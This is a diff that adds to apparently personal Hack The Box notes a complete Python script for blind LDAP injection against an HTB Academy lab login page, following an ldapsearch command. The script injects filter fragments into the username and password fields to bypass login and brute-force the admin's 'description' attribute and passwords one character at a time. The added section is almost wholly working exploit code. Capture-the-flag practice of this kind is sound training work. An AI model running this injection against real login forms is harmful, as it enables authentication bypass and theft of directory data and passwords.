@@ -32,3 +32,120 @@ sudo ldapsearch -H LDAP://10.10.10.161 -x -b "DC=HTB,DC=LOCAL" '(objectClass=Per
 ```
 awk -F'@' '{print $1}' usernames > names
 ```
+## BruteForce object data
+
+```
+#!/usr/bin/env python3
+"""
+HTB Academy - LDAP Blind Injection: Attribute Exfiltration Script
+Exfiltrates LDAP attributes character-by-character via blind injection.
+"""
+
+import requests
+import string
+import sys
+
+# ── Config ────────────────────────────────────────────────────────────────────
+TARGET   = "http://154.57.164.78:31805/index.php"
+USERNAME = "htb-stdnt"
+SESSION  = "kda3963v047j8a29k7drvd9egn"   # replace if expired
+
+# Indicator that the LDAP query returned a result
+SUCCESS_MARKER = "Login successful"
+
+# Characters to try (order matters for speed; common chars first)
+CHARSET = string.ascii_lowercase + string.digits + "_@!-$#. {}"
+
+HEADERS = {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent":   "Mozilla/5.0",
+    "Cookie":       f"PHPSESSID={SESSION}",
+}
+
+# ── Core helpers ──────────────────────────────────────────────────────────────
+
+def query(username: str, password: str) -> bool:
+    """Return True if the server responds with a success indicator."""
+    resp = requests.post(
+        TARGET,
+        data=f"username={requests.utils.quote(username)}&password={requests.utils.quote(password)}",
+        headers=HEADERS,
+        allow_redirects=True,
+        timeout=10,
+    )
+    return SUCCESS_MARKER in resp.text
+
+
+def exfiltrate_attribute(target_user: str, attribute: str) -> str:
+    """
+    Brute-force an LDAP attribute value character by character.
+
+    Injected search filter (simplified):
+        (&(uid=<target_user>)(|(< attribute >=<known>*)(password=invalid)))
+    The or-clause is true whenever the attribute starts with <known>,
+    regardless of the supplied password being wrong.
+    """
+    known = ""
+    print(f"[*] Exfiltrating '{attribute}' for user '{target_user}'")
+
+    while True:
+        found_char = False
+        for ch in CHARSET:
+            candidate = known + ch
+            # Inject into uid to open a new (|(attr=candidate*)(password=invalid)) clause
+            injected_user = f"{target_user})(|({attribute}={candidate}*"
+            injected_pass = "invalid)"
+
+            if query(injected_user, injected_pass):
+                known = candidate
+                print(f"  → {known}", end="\r", flush=True)
+                found_char = True
+                break
+
+        if not found_char:
+            break   # No character matched → we've reached the end of the value
+
+    print(f"\n[+] {attribute} = {known!r}")
+    return known
+
+
+def exfiltrate_password(target_user: str) -> str:
+    """
+    Brute-force the password directly via the password field wildcard trick:
+        (&(uid=<user>)(password=<known>*))
+    """
+    known = ""
+    print(f"[*] Exfiltrating password for user '{target_user}'")
+
+    while True:
+        found_char = False
+        for ch in CHARSET + "!@#$%^&*()-_=+[]{}|;:',.<>?/`~":
+            candidate = known + ch
+            if query(target_user, candidate + "*"):
+                known = candidate
+                print(f"  → {known}", end="\r", flush=True)
+                found_char = True
+                break
+
+        if not found_char:
+            break
+
+    print(f"\n[+] password = {known!r}")
+    return known
+
+
+# ── Main ──────────────────────────────────────────────────────────────────────
+
+if __name__ == "__main__":
+    # Verify connectivity / session is still valid
+    print("[*] Verifying wildcard login (sanity check)...")
+    if not query(USERNAME, "*"):
+        print("[!] Wildcard login failed — check SESSION cookie or target URL.")
+        sys.exit(1)
+    print("[+] Wildcard login OK\n")
+
+    # Exfiltrate the description attribute of admin
+    exfiltrate_attribute("admin", "description")
+
+
+```
